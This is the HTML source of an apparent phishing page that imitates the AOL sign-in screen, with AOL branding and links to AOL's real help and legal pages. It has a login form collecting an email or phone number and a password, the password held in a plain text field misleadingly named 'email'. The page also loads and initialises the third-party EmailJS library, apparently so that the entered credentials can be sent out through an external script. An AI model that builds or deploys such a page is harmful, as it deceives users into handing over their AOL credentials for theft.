<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="dandan.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Bowlby+One+SC&display=swap" rel="stylesheet">

</head>
<body>

     <!-- TOP BAR -->
 <div class="topbar">

      <div class="bowlby-one-sc-regular">
          <a href="http://">AOL
      </div>

      <div class="top-links">
          <a href="https://help.aol.com/">Help</a>
          <a href="https://legal.aol.com/terms/index.html?locale=en-us">Terms</a>
          <a href="https://legal.aol.com/privacy/index.html?locale=en-us">Privacy</a>
      </div>

   </div>

   <div class="pageflex">

<div class="back">
    
    <img src="backpic.jpg" alt="">
</div>

 <form id="form">
    <div class="login-container">

        <h2>Sign in to AOL</h2>
  
     <div class="field">
         <label for="name">Email or phone number</label>
         <input type="text" name="name" id="name">
     </div>
  
  
     <div class="field">
          <label for="email">Password</label>
          <input type="text" name="email" id="email">
     </div>

     <div class="options">

         <div class="remember">
          <input type="checkbox">
          <span>Stay signed in</span>
          </div>

         <a href="#">Forgot password?</a>
      
    </div>


      <input type="submit" id="button" value="Sign in" >

      </div>
 </form>

 </div>

 <script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

 <script type="text/javascript">
  emailjs.init('nBgyr7rOgjrl9eeiY')
 </script>

  <script src="dandan.js"></script>
</body>
</html>
